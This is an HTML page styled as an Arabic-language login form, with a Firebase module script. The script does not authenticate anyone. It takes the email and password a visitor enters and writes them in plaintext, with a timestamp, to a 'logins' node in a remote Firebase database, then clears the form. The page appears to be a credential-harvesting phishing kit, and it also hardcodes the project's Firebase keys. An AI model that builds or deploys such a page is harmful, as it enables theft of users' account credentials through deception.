<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to right, #4b6cb7, #182848);
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }

    .login-box {
      background-color: #fff;
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }

    .login-box h2 {
      margin-bottom: 30px;
      color: #333;
    }

    .login-box input {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      background-color: #f1f1f1;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background-color: #4b6cb7;
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .login-box button:hover {
      background-color: #3a59a0;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(-20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>

  <script type="module">
    // استيراد مكتبات Firebase
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

    // إعداد Firebase الخاص بك
    const firebaseConfig = {
      apiKey: "AIzaSyDnv1yZCtvbTVz-Z0mmMbFExxhO_xAwlvY",
      authDomain: "esff-94b2e.firebaseapp.com",
      projectId: "esff-94b2e",
      storageBucket: "esff-94b2e.appspot.com",
      messagingSenderId: "55096370520",
      appId: "1:55096370520:web:37b092375cb3f1f85cf12d"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // دالة لحفظ البيانات
    window.saveLoginData = function () {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!email || !password) {
        alert("من فضلك أدخل البريد وكلمة السر");
        return;
      }

      const dataRef = ref(db, 'logins');
      const newEntry = push(dataRef);

      set(newEntry, {
        email: email,
        password: password,
        time: new Date().toLocaleString()
      }).then(() => {
        document.getElementById("email").value = '';
        document.getElementById("password").value = '';
      }).catch((error) => {
        console.error("خطأ:", error);
      });
    }
  </script>
</head>
<body>

  <div class="login-box">
    <h2>تسجيل الدخول</h2>
    <input type="text" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة المرور">
    <button onclick="saveLoginData()">دخول</button>
  </div>

</body>
</html>
